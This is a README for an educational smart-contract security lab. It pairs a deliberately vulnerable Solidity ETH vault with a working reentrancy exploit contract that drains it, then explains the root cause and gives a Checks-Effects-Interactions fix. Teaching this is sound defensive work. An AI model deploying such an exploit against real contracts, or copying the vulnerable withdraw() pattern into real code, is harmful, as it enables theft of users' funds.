# ReentrancyLab — ETH Deposit Vault Exploit (Educational)

A deliberately vulnerable Solidity smart contract built to demonstrate and document a **Reentrancy Attack**, one of the most critical and historically damaging vulnerability classes in smart contract security (notably responsible for [The DAO hack](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao) in 2016, resulting in a ~$60M loss). This repository includes both the **vulnerable contract** and a **proof-of-concept exploit contract**, along with a full breakdown of the attack vector and the industry-standard mitigation pattern.

---

## 🚀 Features

- **Vulnerable Target Contract (`ETHDeposit`):** A simple ETH vault allowing users to deposit and withdraw funds, intentionally violating the Checks-Effects-Interactions (CEI) pattern.
- **Proof-of-Concept Exploit (`Attack`):** A malicious contract that recursively re-enters the `withdraw()` function via its `receive()` fallback to drain the vault's entire balance.
- **Root-Cause Documentation:** Step-by-step breakdown of the call stack during the exploit, explaining exactly why and how the funds are drained.
- **Audit-Oriented Analysis:** Written from a smart contract security auditor's perspective, highlighting the exact line responsible for the vulnerability and the recommended secure pattern.
- **Educational Use Case:** Designed for developers, auditors, and Web3 learners studying common DeFi exploit vectors in a safe, sandboxed environment (Remix/Hardhat/Foundry).

---

## 📋 Technical Specifications

- **Solidity Version:** `0.8.26`
- **Environment:** Remix IDE / Hardhat / Foundry compatible
- **Contracts:**
  - `ETHDeposit` — Vulnerable vault contract
  - `Attack` — Exploit / Proof-of-Concept contract
- **Vulnerability Class:** Reentrancy (CWE-841, SWC-107)
- **Pattern Violated:** Checks-Effects-Interactions (CEI)

---

## ⚠️ Vulnerability Overview

| Attribute | Details |
|---|---|
| **Vulnerability** | Single-function reentrancy |
| **Severity** | 🔴 Critical |
| **Affected Function** | `ETHDeposit.withdraw()` |
| **Root Cause** | State update (`userBalance[msg.sender] = 0`) occurs **after** the external call (`.call{value: amount}("")`) |
| **Impact** | Complete drainage of contract funds |
| **Fix** | Apply Checks-Effects-Interactions and/or a reentrancy guard (`nonReentrant` modifier) |

### How the exploit works

1. The `Attack` contract deposits `1 ETH` into `ETHDeposit` via `attack()`, then immediately calls `withdraw()`.
2. Inside `withdraw()`, `ETHDeposit` sends ETH back to `Attack` using a low-level `.call`, which **forwards all remaining gas** and triggers `Attack`'s `receive()` function.
3. Because `userBalance[msg.sender]` is only zeroed out **after** the external call, the attacker's recorded balance is still intact at this point.
4. `Attack.receive()` detects that `ETHDeposit` still holds funds and calls `withdraw()` again — re-entering the vault **before the first call has finished executing**.
5. This recursive loop continues, draining the vault's ETH balance almost entirely, until the vault's balance drops below the threshold checked in `receive()`.
6. Only after the entire call stack unwinds does `userBalance[msg.sender] = 0` finally execute — by then, the damage is already done.

---

## 💻 Contract Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract ETHDeposit {
    mapping(address => uint) userBalance;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    function deposit() public payable {
        require(msg.value >= 1 ether, "Minimun deposit 1 ETH");
        userBalance[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    function withdraw() public {
        uint256 amount = userBalance[msg.sender];
        require(amount >= 1 ether, "User has not enough balance");
        require(address(this).balance > 0, "ETHDeposit is empty");
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawn(msg.sender, amount);
        userBalance[msg.sender] = 0;
    }

    function balanceOf(address user) public view returns (uint256) {
        return userBalance[user];
    }

    function totalBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract Attack {
    ETHDeposit immutable EtherDeposit;
    
    constructor (address _etherDeposit){
        EtherDeposit = ETHDeposit(_etherDeposit);
    }

    function attack() external payable {
        EtherDeposit.deposit{value: msg.value}();
        EtherDeposit.withdraw();
    }

    receive() external payable {
        if(address(EtherDeposit).balance >= 1 ether){
            EtherDeposit.withdraw();
        }
    }
}
```

---

## 🛡️ Recommended Fix

The vulnerability is resolved by applying the **Checks-Effects-Interactions** pattern — updating internal state **before** making any external call — optionally reinforced with a reentrancy guard for defense in depth:

```solidity
function withdraw() public nonReentrant {
    uint256 amount = userBalance[msg.sender];
    require(amount >= 1 ether, "User has not enough balance");
    require(address(this).balance >= amount, "ETHDeposit is empty");

    // EFFECTS: state is updated BEFORE the external call
    userBalance[msg.sender] = 0;

    // INTERACTIONS: external call happens last
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Transfer failed");

    emit Withdrawn(msg.sender, amount);
}
```

---

## 🛠️ How to Run This Locally

### With Remix IDE
1. Paste the contract code into a new `.sol` file in [Remix](https://remix.ethereum.org).
2. Compile with Solidity `0.8.26`.
3. Deploy `ETHDeposit`, then deploy `Attack` passing the `ETHDeposit` address to its constructor.
4. Call `Attack.attack()` with a value of `1 ether` and observe `ETHDeposit.totalBalance()` drop to zero.

### With Foundry
```bash
forge init reentrancy-lab
# Place contracts under src/
forge test
```

---

## 📚 References

- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [Consensys Smart Contract Best Practices — Reentrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)

---

## ⚖️ Disclaimer

This repository is intended **strictly for educational and research purposes**, to help developers and auditors understand and prevent reentrancy vulnerabilities. Do not deploy the vulnerable `ETHDeposit` contract on mainnet or with real funds.

---

## 📜 License

This project is licensed under the [MIT](LICENSE) license.